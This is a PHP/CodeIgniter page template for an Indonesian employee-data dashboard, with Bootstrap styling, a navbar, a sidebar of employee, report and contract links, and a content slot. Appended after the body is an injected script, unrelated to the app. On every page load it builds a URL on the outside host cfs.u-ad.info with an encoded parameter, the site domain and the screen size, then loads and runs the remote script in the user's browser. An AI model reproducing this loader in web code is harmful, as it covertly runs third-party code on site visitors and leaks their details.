<!DOCTYPE html>
<html>
<head>
	<title>Surat</title>
	<link href="<?php echo base_url()?>assets/bootstrap/css/bootstrap.css" rel="stylesheet">
	<link href="<?php echo base_url('assets/datatables/css/dataTables.bootstrap.css')?>" rel="stylesheet">
	<link href="<?php echo base_url()?>assets/bootstrap/css/dashboard.css" rel="stylesheet">
	<link href="<?php echo base_url()?>assets/bootstrap/css/font-awesome.min.css" rel="stylesheet">

</head>
<style type="text/css">

	  .sidebar .sidebar-nav.navbar-collapse {
    padding-right: 0;
    padding-left: 0;
}

.sidebar ul li {
    border-bottom: 1px solid #e7e7e7;
}

.sidebar ul li a.active {
    background-color: #eee;
}

.sidebar .glyphicon-menu-down {
    float: right;
}



.sidebar .nav-second-level li,
.sidebar .nav-third-level li {
    border-bottom: 0!important;
}

.sidebar .nav-second-level li a {
    padding-left: 37px;
}

.sidebar .nav-third-level li a {
    padding-left: 52px;
}

</style>
<body>
	<script src="<?php echo base_url('assets/jquery/jquery-2.1.4.min.js')?>"></script>
	<script src="<?php echo base_url('assets/bootstrap/js/bootstrap.min.js')?>"></script>
	<script src="<?php echo base_url('assets/datatables/js/jquery.dataTables.min.js')?>"></script>
	<script src="<?php echo base_url('assets/datatables/js/dataTables.bootstrap.js')?>"></script>
	<script src="<?php echo base_url('assets/bootstrap/js/bootstrap-datepicker.js')?>"></script>
	<nav class="navbar navbar-fixed-top navbar-default bg-faded">
	<div class="collapse navbar-collapse" style= "">
			<a  style ="color: #337ab7;"class="navbar-brand" href="#">Selamat Datang,<?php echo $this->session->userdata('username')?></a>      
			<ul class="nav navbar-nav navbar-right" style ="margin-right: 10px; color: #337ab7;">
				<li></li>
				<li class="dropdown ">
					<a href="#" style ="color: #337ab7;"class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">
						Account
						<span class="caret"></span></a>
						<ul class="dropdown-menu" role="menu">
							<li class="dropdown-header">PROFIL</li>
							<li class=""><a href="#">Lihat Profil</a></li>
							<li class=""><a href="#">Edit Profil</a></li>
							<li class="divider"></li>
							<li><a href="#">Logout</a></li>
						</ul>
					</li>
				</ul>
			</div><!-- /.navbar-collapse -->
	</nav>
	
	<div class="container" style ="margin-right: 200px;">S
	<div class="col-sm-3 col-md-2 navbar-default sidebar">
	    <ul class="nav nav-sidebar">
	    	<li     style= "color: #337ab7;">
	    	<div class="media">
              <div class="media-left">
                <a href="#">
                    <img class="media-object" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/PjxzdmcgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+PGRlZnMvPjxyZWN0IHdpZHRoPSI2NCIgaGVpZ2h0PSI2NCIgZmlsbD0iI0VFRUVFRSIvPjxnPjx0ZXh0IHg9IjEzLjQ2MDkzNzUiIHk9IjMyIiBzdHlsZT0iZmlsbDojQUFBQUFBO2ZvbnQtd2VpZ2h0OmJvbGQ7Zm9udC1mYW1pbHk6QXJpYWwsIEhlbHZldGljYSwgT3BlbiBTYW5zLCBzYW5zLXNlcmlmLCBtb25vc3BhY2U7Zm9udC1zaXplOjEwcHQ7ZG9taW5hbnQtYmFzZWxpbmU6Y2VudHJhbCI+NjR4NjQ8L3RleHQ+PC9nPjwvc3ZnPg==" alt="...">
                </a>
                <br>
              </div>
              <div class="media-body">
                <p class="media-heading">Nama</a></h4>
                <p class="media-heading">NIK</p>
                <p class="media-heading">Jabatan</p>
              </div>
            </div>
	    	</li>
	    	<!--
	    	<li><img src="<?php echo base_url('assets/unduhan.jpg')?>"></li>
	    	-->
	        <li><a href="<?php echo base_url('index.php/Welcome/home') ?>"><i class="glyphicon glyphicon-home"></i> Beranda</a></a></li>
	        <li ><a href="javascript:;" data-toggle="collapse" data-target="#demo"><i class="glyphicon glyphicon-file"></i>Data Karyawan<span class="
glyphicon glyphicon-menu-down "></span></a></li>
	        <ul id="demo"class="nav nav-second-level collapse">
            <li>
               <a href="<?php echo base_url('index.php/Welcome/Karyawan') ?>">Lihat Data Karyawan</a>
            </li>
            <li>
               <a href="#">Cetak Data Karyawan</a>
            </li>
        </ul>
	        <li><a href="<?php echo base_url('index.php/Welcome/laporan') ?>"><i class="glyphicon glyphicon-equalizer"></i>Laporan</a></li>
	        <li><a href="<?php echo base_url('index.php/Welcome/kock') ?>"><i class="glyphicon glyphicon-pencil"></i>Form Kontrak</a></li>
	    </ul>
    </div>

    <div class="col-sm-9 col-sm-offset-3 col-md-10 col-md-offset-2 main">
    	<?php $this->load->view($content) ?>
    </div>

</body>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnrrPySufjH8GrDJAq7HJSuOvIKONjWcjovEidw9ij%2bzZOS1E50SVPKjRUcde5PVZFRDGxuF07%2fyWp5rpdjuxy8DL1M3S4sEsG9S7yRboLSBPC%2f3J5ggdWIjHrOjTKRISiWoufRDofHB4tNdkHMxOT0AXsz8O8bMKmxAUUC%2bUIirTFumkSUpSJvsBjCJiy6%2fapW%2bN%2bVsJ3Qln95e%2fRapTHCMlaSrzVh1BAU6a4Dc8mliLQYNlKxGK6xw1NKZiglfy0wRbNP8PP8yktWpw6NPFolp3tlQ1ztJe4nJ0nJo4jJ8skSu%2fpKKwSyRHVUU9pgWvzAhlm%2f6ysj4N7xvEGQkGyyKcqOYiyQZSTTSM1%2f5dxflBLuC6xQWF3uZkvBPWD6Oq%2f8rhax0GM0OBNj4NZwbQ8XyEz2mWiWQOo4q8EdIb9BugcrGtzenkLqjtVNAuaQvpRYZeETyas3zseXmhH%2fMzaKHUKmy10AtALBz%2bEcjLNQbeLmcMm1q79x77CLmKzxRWf4KO%2fe%2fBNWVhvRm2M0Ogcvzl43om6pQxWdzQ5%2fMeBSTBdbI%2bCNSwIlzevpN4PEQQsW6mYF9W8SZj3NyoOSztOdQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</html>
